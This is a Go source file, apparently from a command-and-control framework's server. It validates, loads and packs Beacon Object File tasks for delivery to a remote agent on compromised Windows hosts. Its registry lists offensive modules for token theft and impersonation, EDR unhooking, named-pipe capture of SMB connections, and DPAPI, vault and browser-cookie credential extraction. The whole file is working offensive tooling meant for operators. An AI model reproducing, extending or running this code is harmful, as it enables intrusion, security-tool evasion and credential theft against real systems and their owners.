// bof.go — server-side BOF command handling
//
// Operator types:  bof <name> [args...]
//   └─ TryBofCommand intercepts (like TryProfileCommand):
//        1. validates the BOF name against the local arsenal + registry
//        2. reads bofs/bofs_out/<name>.x64.o from the server filesystem
//        3. packs args into the CS Beacon format
//        4. queues a type:"bof" task: {"coff":"<b64>","args":"<b64>"}
//
// STRICT VALIDATION GOAL: garbage NEVER reaches the agent. Unknown BOF or
// malformed args → HTTP 400 with a human-readable message, nothing queued.
//
// Arg types (CS-compatible, matches bofs/include/beacon.h):
//   i:<n>    32-bit int   (raw 4 bytes LE)
//   s:<n>    16-bit short (raw 2 bytes LE)
//   z:<str>  ANSI string  ([4B len][str + NUL] — len includes NUL)
//   Z:<str>  wide string  ([4B len][utf16le + NUL])
//   h:<hex>  raw bytes    ([4B len][decoded bytes])
//   bare numeric (123 / 0x1F) → auto int32
//   bare anything else            → auto z: string
//   quotes group args with spaces:  z:"C:\Program Files\x"

package main

import (
        "encoding/base64"
        "encoding/binary"
        "fmt"
        "os"
        "path/filepath"
        "regexp"
        "sort"
        "strconv"
        "strings"
        "unicode/utf16"
)

// ── Arsenal registry: name → (description, usage, relative_path) ───────
// relative_path is the path under bofs_out/ (without .x64.o suffix).
// Set to "" for legacy flat-layout BOFs (root-level .c → root-level .x64.o).
//
// v2 — nested directory layout. Each BOF lives under a category subdir
// (token/, evasion/, enumeration/, lateral/). The registry maps the
// operator-facing short name (e.g. "getprivs") to the on-disk path
// (e.g. "token/getprivs.x64.o"). Operator always types `bof getprivs`
// — never `bof token/getprivs`.
//
// Keep in sync with bofs/bofs_src/<category>/*.c + bofs/README.md
var bofRegistry = map[string][3]string{
        // ── token/ — identity manipulation (T1134 Access Token Manipulation) ──
        "getprivs":     {"enumerate current thread/process privileges (highlights SeDebug/SeImpersonate)", "bof getprivs", "token/getprivs"},
        "token_steal":  {"duplicate + impersonate token from target PID (one-shot)", "bof token_steal i:<pid>", "token/token_steal"},
        "token_make":   {"create token from user/pass/domain (no spawn — quieter than runas)", "bof token_make z:<user> z:<pass> z:<domain>", "token/token_make"},
        "token_revert": {"revert to self (drop active impersonation)", "bof token_revert", "token/token_revert"},

        // ── evasion/ — runtime telemetry/inspection evasion ───────────────────
        "ntdll_unhook": {"restore fresh ntdll.dll .text over EDR hooks (kills all userland hooks)", "bof ntdll_unhook", "evasion/ntdll_unhook"},

        // ── enumeration/ — recon (T1046/T1018/T1069/T1007) ──────────────────
        "pipe_list":    {"enumerate all named pipes (lateral/privesc intel)", "bof pipe_list", "enumeration/pipe_list"},
        "schtask_enum": {"enumerate scheduled tasks via registry (persistence intel)", "bof schtask_enum", "enumeration/schtask_enum"},
        "service_enum": {"enumerate running Windows services (RUNNING only)", "bof service_enum", "enumeration/service_enum"},
        "reg_query":    {"read a single registry value (Winlogon/AlwaysInstallElevated/etc)", "bof reg_query z:<path> z:<value_name>", "enumeration/reg_query"},
        "vault_enum":   {"enumerate CredMan + Windows Vault entries", "bof vault_enum", "enumeration/vault_enum"},

        // ── lateral/ — lateral movement primitives ────────────────────────────
        "pipe_server":   {"create named pipe + capture one inbound SMB connection (token impersonation)", "bof pipe_server z:<pipe_name> i:<timeout_sec>", "lateral/pipe_server"},
        "dpapi_extract": {"enumerate DPAPI blobs (master keys, CredMan, Chrome/Edge cookies)", "bof dpapi_extract", "lateral/dpapi_extract"},
}

var bofNameRe = regexp.MustCompile(`^[a-z][a-z0-9_]{0,47}$`)

// FindBofsOutDir locates bofs/bofs_out relative to the server CWD or HERO_ROOT.
// Same convention as FindProfilesDir() / heroRootDir().
func FindBofsOutDir() string {
        candidates := []string{}
        if root := os.Getenv("HERO_ROOT"); root != "" {
                candidates = append(candidates, filepath.Join(root, "bofs", "bofs_out"))
        }
        candidates = append(candidates,
                "bofs/bofs_out",
                "../bofs/bofs_out",
                "../../bofs/bofs_out",
        )
        for _, c := range candidates {
                if fi, err := os.Stat(c); err == nil && fi.IsDir() {
                        return c
                }
        }
        return ""
}

// listAvailableBofs — every arsenal .o on disk (registry entry or not).
// Walks bofs_out/ recursively to find all .x64.o files (handles the
// nested category subdir layout introduced in v2).
func listAvailableBofs() []string {
        dir := FindBofsOutDir()
        if dir == "" {
                return nil
        }
        var names []string
        filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
                if err != nil || info.IsDir() {
                        return nil
                }
                base := filepath.Base(path)
                if !strings.HasSuffix(base, ".x64.o") {
                        return nil
                }
                n := strings.TrimSuffix(base, ".x64.o")
                if n != "" {
                        names = append(names, n)
                }
                return nil
        })
        sort.Strings(names)
        return names
}

// bofUsageText — the help block returned when `bof` is typed without args
// OR when `boflist` is typed. v2: clean, no stale BOF names, category-grouped.
func bofUsageText() string {
        var b strings.Builder
        b.WriteString("BOF Arsenal — usage: bof <name> [type:arg ...]\n\n")

        type entry struct{ name, usage, desc string }
        cats := map[string][]entry{}
        catOrder := []string{}
        for name, meta := range bofRegistry {
                cat := "Misc"
                if parts := strings.SplitN(meta[2], "/", 2); len(parts) == 2 {
                        cat = strings.Title(parts[0])
                }
                if _, ok := cats[cat]; !ok {
                        catOrder = append(catOrder, cat)
                }
                cats[cat] = append(cats[cat], entry{name: name, usage: meta[1], desc: meta[0]})
        }
        sort.Strings(catOrder)

        for _, cat := range catOrder {
                b.WriteString("  " + cat + "\n")
                entries := cats[cat]
                sort.Slice(entries, func(i, j int) bool { return entries[i].name < entries[j].name })
                for _, e := range entries {
                        pad := e.name
                        for len(pad) < 18 { pad += " " }
                        b.WriteString("    " + pad + " " + e.desc + "\n")
                        b.WriteString("      " + e.usage + "\n")
                }
                b.WriteString("\n")
        }

        b.WriteString("  Arg types: i:int  s:short  z:str  Z:wide  h:hex\n")
        b.WriteString("            bare numeric = int, bare text = string, quotes group args with spaces\n")
        b.WriteString("  Examples: bof getprivs   |   bof token_steal i:832   |   bof reg_query z:\"HKLM\\...\" z:DefaultUserName\n")
        return b.String()
}

// splitBofTokens — whitespace split with double-quote grouping.
// 'z:"C:\Program Files\x" i:5' → ['z:C:\Program Files\x', 'i:5']
func splitBofTokens(s string) []string {
        var toks []string
        var cur strings.Builder
        inQuote := false
        hasTok := false
        for i := 0; i < len(s); i++ {
                c := s[i]
                switch {
                case c == '"':
                        inQuote = !inQuote
                        hasTok = true
                case !inQuote && (c == ' ' || c == '\t'):
                        if hasTok || cur.Len() > 0 {
                                toks = append(toks, cur.String())
                                cur.Reset()
                                hasTok = false
                        }
                default:
                        cur.WriteByte(c)
                        hasTok = true
                }
        }
        if hasTok || cur.Len() > 0 {
                toks = append(toks, cur.String())
        }
        return toks
}

// packBofArgs — CS Beacon packed-args format (see bofs/include/beacon.h):
//
//      [4B LE argc]
//      int   arg    : 4 bytes raw
//      short arg    : 2 bytes raw
//      z/Z/h/H arg  : [4B LE length][length bytes]  (strings include the NUL)
//
// ── S-M4 FIX: arg size caps ───────────────────────────────────────────────
// The OLD function accepted UNBOUNDED args — an operator (or a malicious
// task-injection path through a compromised operator browser) could queue
// a BOF task with a 1GB hex blob, which the beacon would then try to
// malloc + unpack on the target. That's a denial-of-service vector against
// the agent AND against the server (task queue grows unboundedly). Now:
//   • each individual arg token is capped at 1MB (maxBofArgSize)
//   • the total packed output is capped at 2MB (maxBofArgsTotal)
// Exceeding either returns an error → HTTP 400 to the operator → nothing
// queued. Both limits are well above any realistic BOF arg payload
// (largest known BOF arg set: NetCommander enum ≈ 4KB total).
const (
        maxBofArgSize   = 1 * 1024 * 1024 // 1MB per individual arg token
        maxBofArgsTotal = 2 * 1024 * 1024 // 2MB total packed output buffer
)

func packBofArgs(tokens []string) ([]byte, error) {
        out := make([]byte, 4, 64)
        binary.LittleEndian.PutUint32(out, uint32(len(tokens)))

        for _, tok := range tokens {
                // ── S-M4: per-arg size cap (1MB) ──────────────────────────────
                // Checked on the RAW token before any decode/pack work — short-
                // circuits a 100MB hex blob in O(1) instead of decoding it first.
                if len(tok) > maxBofArgSize {
                        preview := tok
                        if len(preview) > 32 {
                                preview = preview[:32] + "..."
                        }
                        return nil, fmt.Errorf("arg %q too large: %d bytes (max %d) — split the payload or use a staged loader",
                                preview, len(tok), maxBofArgSize)
                }

                switch {
                case strings.HasPrefix(tok, "i:"):
                        n, err := parseInt32(tok[2:])
                        if err != nil {
                                return nil, fmt.Errorf("bad int arg %q: %v", tok, err)
                        }
                        out = appendI32(out, n)

                case strings.HasPrefix(tok, "s:"):
                        n, err := strconv.ParseInt(tok[2:], 0, 16)
                        if err != nil {
                                return nil, fmt.Errorf("bad short arg %q: %v", tok, err)
                        }
                        b := make([]byte, 2)
                        binary.LittleEndian.PutUint16(b, uint16(n))
                        out = append(out, b...)

                case strings.HasPrefix(tok, "z:"):
                        data := append([]byte(tok[2:]), 0)
                        out = appendLenPrefixed(out, data)

                case strings.HasPrefix(tok, "Z:"):
                        wide, err := utf16Encode(tok[2:])
                        if err != nil {
                                return nil, fmt.Errorf("bad wide arg %q: %v", tok, err)
                        }
                        out = appendLenPrefixed(out, wide)

                case strings.HasPrefix(tok, "h:"):
                        data, err := hexDecode(tok[2:])
                        if err != nil {
                                return nil, fmt.Errorf("bad hex arg %q: %v", tok, err)
                        }
                        out = appendLenPrefixed(out, data)

                default:
                        // bare token: numeric → int32, else string
                        if n, err := parseInt32(tok); err == nil {
                                out = appendI32(out, n)
                        } else {
                                data := append([]byte(tok), 0)
                                out = appendLenPrefixed(out, data)
                        }
                }

                // ── S-M4: total packed-output cap (2MB) ─────────────────────
                // Checked AFTER appending so we catch a single arg that pushes
                // the buffer over the limit (e.g., a 1.9MB hex blob + a 0.2MB
                // string arg). The beacon's argument parser trusts the 4B LE
                // length prefix and would happily try to malloc 2GB if we let
                // it through — this cap protects the agent's heap.
                if len(out) > maxBofArgsTotal {
                        return nil, fmt.Errorf("total packed args too large: %d bytes (max %d) — reduce arg count or size",
                                len(out), maxBofArgsTotal)
                }
        }
        return out, nil
}

func parseInt32(s string) (int32, error) {
        n, err := strconv.ParseInt(s, 0, 32) // base 0 → 0x hex support
        if err != nil {
                return 0, err
        }
        return int32(n), nil
}

func appendI32(out []byte, n int32) []byte {
        b := make([]byte, 4)
        binary.LittleEndian.PutUint32(b, uint32(n))
        return append(out, b...)
}

func appendLenPrefixed(out, data []byte) []byte {
        b := make([]byte, 4)
        binary.LittleEndian.PutUint32(b, uint32(len(data)))
        out = append(out, b...)
        return append(out, data...)
}

func utf16Encode(s string) ([]byte, error) {
        // utf16.Encode produces proper UTF-16 code units (surrogate pairs
        // included); the +2 trailing zero bytes are the UTF-16 NUL.
        units := utf16.Encode([]rune(s))
        buf := make([]byte, 2*len(units)+2)
        for i, v := range units {
                binary.LittleEndian.PutUint16(buf[2*i:], v)
        }
        return buf, nil
}

func hexDecode(s string) ([]byte, error) {
        s = strings.ReplaceAll(s, " ", "")
        if len(s)%2 != 0 {
                return nil, fmt.Errorf("odd hex length")
        }
        out := make([]byte, len(s)/2)
        for i := 0; i < len(out); i++ {
                v, err := strconv.ParseUint(s[2*i:2*i+2], 16, 8)
                if err != nil {
                        return nil, err
                }
                out[i] = byte(v)
        }
        return out, nil
}

// loadBofObject reads + sanity-checks a compiled BOF from bofs/bofs_out/.
// v2: handles nested directory layout — registry-provided relative_path
// first, then flat fallback, then recursive walk as last resort.
func loadBofObject(name string) ([]byte, error) {
        if !bofNameRe.MatchString(name) {
                return nil, fmt.Errorf("invalid BOF name %q (lowercase letters, digits, _ only)", name)
        }
        dir := FindBofsOutDir()
        if dir == "" {
                return nil, fmt.Errorf("bofs/bofs_out not found on server — run ./build.sh bofs")
        }

        var candidatePaths []string
        if meta, ok := bofRegistry[name]; ok && meta[2] != "" {
                candidatePaths = append(candidatePaths, filepath.Join(dir, meta[2]+".x64.o"))
        }
        candidatePaths = append(candidatePaths, filepath.Join(dir, name+".x64.o"))

        var lastReadErr error
        var triedPaths []string
        for _, path := range candidatePaths {
                triedPaths = append(triedPaths, path)
                data, err := os.ReadFile(path)
                if err != nil {
                        if os.IsNotExist(err) {
                                continue
                        }
                        lastReadErr = err
                        continue
                }
                if len(data) < 2 {
                        return nil, fmt.Errorf("%s: empty object", path)
                }
                if len(data) > 2<<20 {
                        return nil, fmt.Errorf("%s: object too large (%d bytes, cap 2MB)", path, len(data))
                }
                machine := binary.LittleEndian.Uint16(data[0:2])
                if machine != 0x8664 {
                        return nil, fmt.Errorf("%s: not an x64 COFF (machine=0x%04x)", path, machine)
                }
                return data, nil
        }

        // Last resort: walk the tree for any file matching <name>.x64.o
        var walkMatch string
        filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
                if err != nil || info.IsDir() {
                        return nil
                }
                if filepath.Base(path) == name+".x64.o" {
                        walkMatch = path
                        return filepath.SkipAll
                }
                return nil
        })
        if walkMatch != "" {
                data, err := os.ReadFile(walkMatch)
                if err == nil && len(data) >= 2 {
                        machine := binary.LittleEndian.Uint16(data[0:2])
                        if machine == 0x8664 {
                                return data, nil
                        }
                }
        }

        avail := listAvailableBofs()
        hint := ""
        if len(avail) > 0 {
                hint = " — available: " + strings.Join(avail, ", ")
        }
        if lastReadErr != nil {
                return nil, fmt.Errorf("BOF '%s' found but unreadable: %v%s",
                        name, lastReadErr, hint)
        }
        return nil, fmt.Errorf("BOF '%s' not found in arsenal (tried: %s)%s",
                name, strings.Join(triedPaths, ", "), hint)
}

// TryBofCommand — mirrors TryProfileCommand contract:
//
//      handled=true, taskCmd=""    → handled, `taskArgs` holds the message (info or error)
//      handled=true, taskCmd="bof" → handled, `taskArgs` is the raw task JSON
//      handled=false               → not a bof command, caller continues
//
// v2: `boflist` and `bof` (no args) are SERVER-SIDE ONLY — they return
// the BOF catalog as an INFO message. The agent NEVER sees these commands.
// The API handler distinguishes INFO (HTTP 200) from ERROR (HTTP 400)
// using the `isInfo` flag returned via a third return value.
func TryBofCommand(command, args string) (bool, string, string, bool) {
        cmd := strings.ToLower(strings.TrimSpace(command))
        switch cmd {
        case "boflist":
                // INFO response — server-side only, agent never sees this
                return true, "", bofUsageText(), true

        case "bof":
                toks := splitBofTokens(strings.TrimSpace(args))
                if len(toks) == 0 {
                        // `bof` with no args — show usage (INFO, not error)
                        return true, "", bofUsageText(), true
                }
                name := strings.ToLower(toks[0])
                packed, err := packBofArgs(toks[1:])
                if err != nil {
                        return true, "", "bof " + name + ": " + err.Error(), false
                }
                coff, err := loadBofObject(name)
                if err != nil {
                        return true, "", err.Error(), false
                }
                if meta, ok := bofRegistry[name]; ok {
                        return true, "bof", fmt.Sprintf(`{"coff":%q,"args":%q,"usage":%q}`,
                                base64.StdEncoding.EncodeToString(coff),
                                base64.StdEncoding.EncodeToString(packed),
                                meta[1]), false
                }
                return true, "bof", fmt.Sprintf(`{"coff":%q,"args":%q}`,
                        base64.StdEncoding.EncodeToString(coff),
                        base64.StdEncoding.EncodeToString(packed)), false
        }
        return false, "", "", false
}
